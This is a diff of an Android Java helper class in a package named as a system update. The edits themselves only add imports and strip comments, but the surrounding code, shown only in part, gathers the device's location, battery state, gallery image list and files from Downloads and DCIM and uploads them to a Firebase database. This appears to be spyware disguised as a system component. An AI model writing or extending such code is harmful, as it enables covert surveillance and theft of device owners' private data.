@@ -1,5 +1,6 @@
 package com.system.update;
 
+import android.Manifest;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
@@ -21,6 +22,7 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
+import androidx.core.content.ContextCompat;
 import com.google.firebase.database.DatabaseReference;
 import java.io.File;
 import java.util.ArrayList;
@@ -182,7 +184,6 @@ public class Helpers {
         return String.format("%.2f GB", mb / 1024.0);
     }
 
-    // ===== Battery =====
     public static void pushBattery(Context ctx, DatabaseReference ref) {
         IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent bs = ctx.registerReceiver(null, ifilter);
@@ -196,7 +197,6 @@ public class Helpers {
         ref.child("battery").setValue(m);
     }
 
-    // ===== Location =====
     public static void pushLocation(Context ctx, DatabaseReference ref) {
         try {
             LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
@@ -221,7 +221,6 @@ public class Helpers {
         }
     }
 
-    // ===== Gallery (Images) =====
     public static void pushGallery(Context ctx, DatabaseReference ref) {
         List<Map<String, Object>> list = new ArrayList<>();
         Cursor c = ctx.getContentResolver().query(
@@ -245,7 +244,6 @@ public class Helpers {
         ref.child("gallery").setValue(list);
     }
 
-    // ===== Files (Downloads + DCIM) =====
     public static void pushFiles(Context ctx, DatabaseReference ref) {
         List<Map<String, Object>> list = new ArrayList<>();
         File[] dirs = {
@@ -274,4 +272,4 @@ public class Helpers {
         }
         ref.child("files").setValue(list);
     }
-    }
+            }
